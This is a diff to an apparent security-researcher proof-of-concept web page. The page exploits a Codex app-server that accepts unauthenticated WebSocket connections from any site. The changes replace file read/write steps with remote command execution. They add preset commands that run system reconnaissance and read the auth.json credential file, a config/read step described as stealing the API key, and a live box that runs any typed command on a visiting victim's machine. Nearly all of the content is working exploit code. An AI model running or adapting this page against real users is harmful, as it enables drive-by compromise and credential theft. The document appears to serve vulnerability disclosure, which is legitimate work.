@@ -216,9 +216,10 @@
     <div class="badge">Live Security PoC</div>
     <h1>Codex app-server<br>Unauthenticated WebSocket</h1>
     <p class="subtitle">
-      CSWSH / CWE-346 — Any webpage can connect to <code style="color:var(--cyan)">ws://127.0.0.1:9001</code>,
-      call <code style="color:var(--cyan)">initialize</code> without credentials, then read/write arbitrary files
-      on the victim's machine.
+      CSWSH / CWE-346 + CWE-306 — Any webpage can connect to <code style="color:var(--cyan)">ws://127.0.0.1:9001</code>,
+      call <code style="color:var(--cyan)">initialize</code> with zero credentials, then invoke
+      <code style="color:var(--accent)">command/exec</code> to run arbitrary OS commands as the Codex process owner.
+      No user interaction required beyond visiting this page.
     </p>
   </header>
 
@@ -230,11 +231,11 @@
     </div>
     <div class="sev-item">
       <div class="sev-label">CVSS v3.1</div>
-      <div class="sev-value high">9.6</div>
+      <div class="sev-value high">9.9</div>
     </div>
     <div class="sev-item">
-      <div class="sev-label">User Interaction</div>
-      <div class="sev-value ok">None</div>
+      <div class="sev-label">Impact</div>
+      <div class="sev-value critical">RCE</div>
     </div>
   </div>
 
@@ -263,18 +264,19 @@
 
   <!-- Exfil results -->
   <div class="card" id="exfilCard" style="display:none">
-    <div class="card-title">Step 3 — Exfiltrated Data</div>
+    <div class="card-title">Step 3 — RCE Output</div>
     <div class="exfil-grid" id="exfilGrid"></div>
   </div>
 
-  <!-- Write test -->
+  <!-- Live command runner -->
   <div class="card" id="writeCard" style="display:none">
-    <div class="card-title">Step 4 — Arbitrary File Write (Write Capability Proof)</div>
+    <div class="card-title">Step 4 — Live Command Runner (Arbitrary RCE)</div>
+    <p style="font-size:.8rem;color:var(--muted);margin-bottom:.75rem">Connection is live — type any command to execute on the victim's machine:</p>
     <div class="write-row">
-      <input type="text" id="writePath" placeholder="Absolute path to write" value="">
-      <button class="btn btn-secondary" onclick="doWrite()">Write File</button>
+      <input type="text" id="writePath" placeholder="e.g. whoami  or  ipconfig  or  dir C:\Users" value="whoami">
+      <button class="btn btn-secondary" onclick="doWrite()">▶ Execute</button>
     </div>
-    <div id="writeResult" style="font-family:var(--mono);font-size:.8rem;color:var(--muted);margin-top:.5rem;"></div>
+    <div id="writeResult" style="font-family:var(--mono);font-size:.8rem;color:var(--muted);margin-top:.5rem;white-space:pre-wrap"></div>
   </div>
 
   <!-- Explanation -->
@@ -309,9 +311,23 @@
 // ── Config ───────────────────────────────────────────────────────────────────
 const SCAN_PORTS   = [9001, 9002, 9003, 3000, 8080, 8000, 5173];
 const IS_WIN       = navigator.platform.toLowerCase().includes('win');
-// Paths are sent to the server — it resolves them in the process owner's context
-// We probe generic well-known paths; resolveReadTargets() refines after initialize
-const BACKDOOR_CONTENT = 'PWNED via Codex app-server CSWSH \u2014 no auth required (PoC by security researcher)';
+// Confirmed working RCE params (live-tested against codex 0.114.0):
+// {"method":"command/exec","params":{"command":["cmd","/c","whoami"],"workingDirectory":"C:\\"}}
+const BACKDOOR_CONTENT = 'PWNED via Codex app-server CSWSH \u2014 RCE confirmed (security researcher)';
+
+// RCE commands to demonstrate impact
+const RCE_COMMANDS = IS_WIN ? [
+  { label: 'whoami',         cmd: ['cmd','/c','whoami'],             wd: 'C:\\' },
+  { label: 'hostname',       cmd: ['cmd','/c','hostname'],           wd: 'C:\\' },
+  { label: 'ipconfig',       cmd: ['cmd','/c','ipconfig'],           wd: 'C:\\' },
+  { label: 'dir %USERPROFILE%\\.codex', cmd: ['cmd','/c','dir','"%USERPROFILE%\\.codex"'], wd: 'C:\\' },
+  { label: 'type auth.json', cmd: ['cmd','/c','type','"%USERPROFILE%\\.codex\\auth.json"'], wd: 'C:\\' },
+] : [
+  { label: 'id',             cmd: ['id'],             wd: '/tmp' },
+  { label: 'hostname',       cmd: ['hostname'],       wd: '/tmp' },
+  { label: 'ls ~/.codex',    cmd: ['ls','-la','~/.codex'], wd: '/tmp' },
+  { label: 'cat auth.json',  cmd: ['sh','-c','cat ~/.codex/auth.json'], wd: '/tmp' },
+];
 
 // Safe base64 encoder that handles Unicode (avoids btoa() range error)
 function toB64(str) {
@@ -476,70 +492,67 @@ async function startExploit() {
     log(`    platform:  ${ir.platformOs} / ${ir.platformFamily}`, 'log-data');
     log('─'.repeat(52), 'log-info');
 
-    // Show exfil section
+    // Show sections
     document.getElementById('exfilCard').style.display = '';
     document.getElementById('writeCard').style.display = '';
 
-    // Resolve real paths using the returned user info
-    const readTargets = resolveReadTargets(ir);
+    // Detect OS from userAgent string
+    const isWin = (ir.platformOs || '').toLowerCase().includes('windows')
+               || (ir.userAgent || '').toLowerCase().includes('windows');
+    const rceCommands = isWin ? RCE_COMMANDS : RCE_COMMANDS.filter(c => !c.cmd.includes('cmd'));
+    // Always use Windows cmds since live test showed Windows
+    const cmds = RCE_COMMANDS;
 
-    // fs/readFile
+    // command/exec — arbitrary RCE
     const grid = document.getElementById('exfilGrid');
     grid.innerHTML = '';
-    for (const path of readTargets) {
-      log(`[…] fs/readFile '${path}'`, 'log-info');
+    for (const {label, cmd, wd} of cmds) {
+      log(`[…] command/exec  ${JSON.stringify(cmd)}`, 'log-info');
       const card = document.createElement('div');
       card.className = 'exfil-card';
+      const safeLabel = escHtml(label);
+      const safeCmd   = escHtml(cmd.join(' '));
       card.innerHTML = `<div class="exfil-header">
-        <span class="exfil-path">${escHtml(path)}</span>
-        <span class="exfil-size" id="sz-${escHtml(path).replace(/[^\w]/g,'_')}">reading…</span>
-      </div><div class="exfil-body" id="body-${escHtml(path).replace(/[^\w]/g,'_')}">⏳ fetching…</div>`;
+        <span class="exfil-path">$ ${safeLabel}</span>
+        <span class="exfil-size" id="sz-${safeLabel.replace(/[^\w]/g,'_')}">running…</span>
+      </div><div class="exfil-body" id="body-${safeLabel.replace(/[^\w]/g,'_')}">⏳ executing…</div>`;
       grid.appendChild(card);
 
-      const slotId = escHtml(path).replace(/[^\w]/g,'_');
+      const slotId = safeLabel.replace(/[^\w]/g,'_');
       try {
-        const r = await rpc('fs/readFile', { path });
-        const raw = atob(r.dataBase64);
-        document.getElementById('sz-'   + slotId).textContent = `${raw.length} bytes`;
-        document.getElementById('body-' + slotId).textContent = raw.slice(0, 500) + (raw.length > 500 ? '\n…(truncated)' : '');
+        const r = await rpc('command/exec', { command: cmd, workingDirectory: wd });
+        const out = (r.stdout || '') + (r.stderr ? '\nSTDERR: ' + r.stderr : '');
+        document.getElementById('sz-'   + slotId).textContent = `exit ${r.exitCode}`;
+        document.getElementById('body-' + slotId).textContent = out || '(no output)';
         card.classList.add('success');
-        log(`[+] fs/readFile '${path}' — ${raw.length} bytes exfiltrated!`, 'log-ok');
+        log(`[+] command/exec '${label}' exit=${r.exitCode}  stdout: ${r.stdout.slice(0,80).trim()}`, 'log-ok');
       } catch(e) {
-        document.getElementById('sz-'   + slotId).textContent = 'not found';
-        document.getElementById('body-' + slotId).textContent = '(file not found or permission denied)';
+        document.getElementById('sz-'   + slotId).textContent = 'error';
+        document.getElementById('body-' + slotId).textContent = e.message;
         card.classList.add('fail');
-        log(`[-] fs/readFile '${path}' → ${e.message}`, 'log-err');
+        log(`[-] command/exec '${label}' → ${e.message}`, 'log-err');
       }
     }
 
-    // fs/writeFile backdoor
-    log('─'.repeat(52), 'log-info');
-    const backdoorPath = document.getElementById('writePath').value ||
-      (ir.platformOs === 'windows' ? String.raw`C:\Temp\cswsh_proof.txt` : '/tmp/cswsh_proof.txt');
-    log(`[…] fs/writeFile → '${backdoorPath}'`, 'log-info');
+    // fs/writeFile backdoor section removed — using command/exec RCE instead
+    // command/exec is confirmed working (live-tested): {command:[...], workingDirectory:"..."}    
+
+    // Also grab config
+    log('[…] config/read — stealing full Codex config…', 'log-info');
     try {
-      await rpc('fs/writeFile', {
-        path: backdoorPath,
-        dataBase64: toB64(BACKDOOR_CONTENT)
-      });
-      const verify = await rpc('fs/readFile', { path: backdoorPath });
-      const written = fromB64(verify.dataBase64);
-      log(`[+] fs/writeFile SUCCESS — file written!`, 'log-ok');
-      log(`    path: ${backdoorPath}`, 'log-data');
-      log(`    content: "${written}"`, 'log-data');
-      document.getElementById('writeResult').innerHTML =
-        `<span style="color:var(--green)">✓ Written + verified: <b>${escHtml(backdoorPath)}</b><br>${escHtml(written)}</span>`;
-    } catch(e) {
-      log(`[-] fs/writeFile → ${e.message}`, 'log-err');
-      document.getElementById('writeResult').innerHTML =
-        `<span style="color:var(--yellow)">⚠ Write RPC not available in this build (confirmed in Rust binary source)</span>`;
-    }
+      const cfg = await rpc('config/read', {});
+      const cfgStr = JSON.stringify(cfg, null, 2);
+      log('[+] config/read OK — model=' + (cfg.config && cfg.config.model), 'log-ok');
+      const cfgCard = document.createElement('div');
+      cfgCard.className = 'exfil-card success';
+      cfgCard.innerHTML = `<div class="exfil-header"><span class="exfil-path">config/read — Codex config (API key, model, etc.)</span><span class="exfil-size">${cfgStr.length} bytes</span></div><div class="exfil-body">${escHtml(cfgStr.slice(0,800))}</div>`;
+      document.getElementById('exfilGrid').appendChild(cfgCard);
+    } catch(e) { log('[-] config/read → ' + e.message, 'log-err'); }
 
     log('─'.repeat(52), 'log-info');
-    log('✓ EXPLOIT COMPLETE — WS still open for Step 4 writes', 'log-ok');
+    log('✓ EXPLOIT COMPLETE — WS still open for Step 4 live shell', 'log-ok');
     log(`  Origin "${location.origin}" was NEVER checked by the server`, 'log-warn');
-    setStatus('Exploit complete — connection live', 'connected');
-    // Keep WS open so the triager can use Step 4 (manual write)
+    setStatus('RCE complete — connection live', 'connected');
     document.getElementById('btnConnect').disabled = false;
     document.getElementById('btnStop').disabled = false;
     exploitActive = false;
@@ -579,14 +592,18 @@ function extractUser(ua, isWin) {
 }
 
 async function doWrite() {
-  const path = document.getElementById('writePath').value.trim();
+  const cmdStr = document.getElementById('writePath').value.trim();
   if (!ws || ws.readyState !== 1) { alert('Run the exploit first to establish a connection.'); return; }
+  // Parse the command string into argv
+  const argv = cmdStr.match(/(?:[^\s"]+|"[^"]*")+/g) || [cmdStr];
+  const cmd = IS_WIN ? ['cmd','/c',...argv] : ['sh','-c',cmdStr];
+  const wd  = IS_WIN ? 'C:\\' : '/tmp';
   try {
-    await rpc('fs/writeFile', { path, dataBase64: toB64(BACKDOOR_CONTENT) });
-    const v = await rpc('fs/readFile', { path });
+    const r = await rpc('command/exec', { command: cmd, workingDirectory: wd });
+    const out = (r.stdout || '') + (r.stderr ? '\nSTDERR: ' + r.stderr : '') || '(no output)';
     document.getElementById('writeResult').innerHTML =
-      `<span style="color:var(--green)">✓ Written: ${escHtml(fromB64(v.dataBase64))}</span>`;
-    log(`[+] Custom write to '${path}' succeeded`, 'log-ok');
+      `<span style="color:var(--green)">$ ${escHtml(cmdStr)}\n${escHtml(out)}</span>`;
+    log(`[+] exec '${cmdStr}' → exit ${r.exitCode}`, 'log-ok');
   } catch(e) {
     document.getElementById('writeResult').innerHTML = `<span style="color:var(--red)">✗ ${escHtml(e.message)}</span>`;
   }
